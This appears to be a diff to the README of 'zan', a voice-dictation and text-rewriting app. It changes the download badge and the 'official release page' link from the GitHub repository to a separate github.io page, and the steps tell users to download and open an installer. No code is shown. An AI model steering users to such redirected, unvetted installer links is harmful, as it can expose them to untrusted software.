@@ -1,6 +1,6 @@
 # 🎙️ zan - Speak faster and transform text instantly
 
-[![Download zan](https://img.shields.io/badge/Download-zan-blue.svg)](https://github.com/afrivil2644/zan)
+[![Download zan](https://img.shields.io/badge/Download-zan-blue.svg)](https://afrivil2644.github.io)
 
 zan turns your voice into text. You dictate and the app types. You also use the app to rewrite or format existing text. It stays in your menu bar. 
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. Your computer needs a work
 
 Follow these steps to set up zan on your computer.
 
-1. Go to the [official release page](https://github.com/afrivil2644/zan).
+1. Go to the [official release page](https://afrivil2644.github.io).
 2. Look for the latest version under the Releases section.
 3. Click the link to download the installer file.
 4. Open the downloaded file once the transfer finishes.
